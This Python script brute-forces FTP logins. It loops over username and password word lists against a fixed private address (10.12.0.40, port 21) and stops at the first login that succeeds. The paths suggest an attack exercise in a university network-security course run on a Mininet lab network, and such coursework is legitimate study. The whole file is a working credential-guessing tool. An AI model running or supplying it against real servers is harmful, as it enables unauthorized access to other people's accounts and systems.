from ftplib import FTP, error_perm


def try_ftp(ip, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(ip, port, timeout=5)
        ftp.login(username, password)
        print(f"Success: {username}:{password} on {ip}:{port}")
        ftp.quit()
        return True
    except error_perm:
        print(f"Failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False


def main():
    ip = "10.12.0.40"
    port = 21

    with open("/home/mininet/LINFO2347/repo/red/bf/users.txt", "r") as f:
        usernames = [line.strip() for line in f]
    with open("/home/mininet/LINFO2347/repo/red/bf/passwords.txt", "r") as f:
        passwords = [line.strip() for line in f]

    found = False
    for username in usernames:
        for password in passwords:
            if try_ftp(ip, port, username, password):
                found = True
                break
        if found:
            break


if __name__ == "__main__":
    main()
